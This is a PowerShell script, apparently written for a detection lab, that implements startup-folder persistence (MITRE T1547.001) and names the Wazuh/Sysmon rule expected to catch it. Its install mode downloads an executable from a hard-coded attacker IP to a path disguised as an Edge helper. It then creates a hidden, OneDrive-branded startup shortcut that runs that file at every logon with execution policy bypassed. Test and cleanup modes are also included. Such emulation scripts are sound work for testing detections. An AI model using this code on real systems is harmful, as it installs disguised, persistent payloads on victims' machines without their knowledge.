# =============================================================================
# persist_02_startup.ps1 -- Startup Folder Shortcut Persistence
# MITRE ATT&CK: T1547.001 - Boot or Logon Autostart Execution: Startup Folder
# =============================================================================
# Wazuh Detection:
#   - Sysmon EID 11 (FileCreate)
#     TargetFilename: *\Start Menu\Programs\Startup\*.lnk
#   - Wazuh Rule ID: 61604 (Sysmon file created in startup folder)
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\Edge\EdgeHelper.exe"

$STARTUP_DIR = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$LNK_NAME    = "OneDriveHelper.lnk"
$LNK_PATH    = Join-Path $STARTUP_DIR $LNK_NAME
$LNK_ARGS    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`""
$LNK_DESC    = "OneDrive Sync Helper"
# ==============================================================================

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "# dummy payload for lab testing")
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing Startup Folder Shortcut persistence..." -ForegroundColor Cyan
    Download-Payload
    try {
        if (-not (Test-Path $STARTUP_DIR)) {
            New-Item -ItemType Directory -Path $STARTUP_DIR -Force | Out-Null
        }
        # Create shortcut via WScript.Shell COM -- Sysmon EID 11 triggers here
        $WshShell = New-Object -ComObject "WScript.Shell"
        $Shortcut = $WshShell.CreateShortcut($LNK_PATH)
        $Shortcut.TargetPath       = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        $Shortcut.Arguments        = $LNK_ARGS
        $Shortcut.WorkingDirectory = $env:TEMP
        $Shortcut.Description      = $LNK_DESC
        $Shortcut.WindowStyle      = 7   # 7 = Minimized

        $oneDriveIcon = "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDrive.exe"
        if (Test-Path $oneDriveIcon) { $Shortcut.IconLocation = "$oneDriveIcon,0" }

        $Shortcut.Save()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($WshShell) | Out-Null

        Write-Host "[+] Shortcut created: $LNK_PATH" -ForegroundColor Green
        Write-Host "    Target: powershell.exe $LNK_ARGS" -ForegroundColor Gray
        Write-Host "[+] Persistence installed. Payload will run on next logon." -ForegroundColor Green
        return $true
    } catch {
        Write-Error "[!] Failed to install persistence: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying Startup Folder persistence..." -ForegroundColor Cyan
    $ok = $true

    if (Test-Path $LNK_PATH) {
        Write-Host "[+] Shortcut EXISTS: $LNK_PATH" -ForegroundColor Green
        try {
            $WshShell = New-Object -ComObject "WScript.Shell"
            $sc = $WshShell.CreateShortcut($LNK_PATH)
            Write-Host "    Target: $($sc.TargetPath)" -ForegroundColor Gray
            Write-Host "    Args  : $($sc.Arguments)" -ForegroundColor Gray
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($WshShell) | Out-Null
        } catch { Write-Warning "[!] Could not read shortcut: $_" }
    } else {
        Write-Host "[-] Shortcut NOT found: $LNK_PATH" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload file EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload file MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }

    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing Startup Folder persistence..." -ForegroundColor Cyan
    if (Test-Path $LNK_PATH) {
        Remove-Item -Path $LNK_PATH -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Shortcut removed: $LNK_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Shortcut not found (already removed?)" -ForegroundColor Yellow
    }
    if (Test-Path $PAYLOAD_PATH) {
        Remove-Item -Path $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Payload removed: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload not found (already removed?)" -ForegroundColor Yellow
    }
    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_02_startup.ps1 -- T1547.001 Startup Folder LNK" -ForegroundColor Magenta
Write-Host " Wazuh: Sysmon EID 11 (FileCreate in Startup folder)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
